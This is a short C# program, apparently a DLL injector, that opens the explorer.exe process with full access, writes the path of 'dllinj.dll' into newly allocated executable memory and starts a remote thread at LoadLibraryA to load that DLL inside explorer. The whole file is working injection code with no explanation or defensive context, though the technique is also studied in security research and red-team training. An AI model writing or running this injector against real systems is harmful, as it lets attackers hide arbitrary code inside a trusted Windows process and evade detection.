using System;
using System.Diagnostics;
using System.IO;
using System.Runtime.InteropServices;
using System.Text;

/// <summary>
/// Programmer : Diljith Suresh
/// </summary>
/// 

namespace Dll_Inject
{
    class Program
    {
        [DllImport("kernel32.dll", SetLastError = true, ExactSpelling = true)]
        static extern IntPtr OpenProcess(uint processAccess, bool bInheritHandle, int processId);
        [DllImport("kernel32.dll", SetLastError = true, ExactSpelling = true)]
        static extern IntPtr VirtualAllocEx(IntPtr hProcess, IntPtr lpAddress, uint dwSize, uint flAllocationType, uint flProtect);
        [DllImport("kernel32.dll")]
        static extern bool WriteProcessMemory(IntPtr hProcess, IntPtr lpBaseAddress,  byte[] lpBuffer, Int32 nSize, out IntPtr lpNumberOfBytesWritten);
        [DllImport("kernel32.dll")]
        static extern IntPtr CreateRemoteThread(IntPtr hProcess, IntPtr lpThreadAttributes, uint dwStackSize, IntPtr lpStartAddress, IntPtr lpParameter, uint  dwCreationFlags, IntPtr lpThreadId);
        [DllImport("kernel32", CharSet = CharSet.Ansi, ExactSpelling = true,  SetLastError = true)]
        static extern IntPtr GetProcAddress(IntPtr hModule, string procName);
        [DllImport("kernel32.dll", CharSet = CharSet.Auto)]
        public static extern IntPtr GetModuleHandle(string lpModuleName);
        static void Main(string[] args)
        {
            String dllName = "dllinj.dll";
            string dllfullpath = Path.GetFullPath(dllName);
            Console.WriteLine(dllfullpath);
            Process[] explorerProc = Process.GetProcessesByName("explorer");
            int explorerProcPID = explorerProc[0].Id;
            IntPtr TargetProcessHandle = OpenProcess(0x001F0FFF, false, explorerProcPID);
            IntPtr baseaddr = VirtualAllocEx(TargetProcessHandle, IntPtr.Zero, (uint)dllfullpath.Length, 0x3000, 0x40);
            IntPtr numberOfBytesWritten;
            WriteProcessMemory(TargetProcessHandle, baseaddr, Encoding.Default.GetBytes(dllfullpath), dllfullpath.Length, out numberOfBytesWritten);
            IntPtr ProcLoadLib = GetProcAddress(GetModuleHandle("kernel32.dll"), "LoadLibraryA");
            IntPtr hThread = CreateRemoteThread(TargetProcessHandle, IntPtr.Zero, 0, ProcLoadLib, baseaddr, 0, IntPtr.Zero);
            Console.ReadLine();
        }
    }
}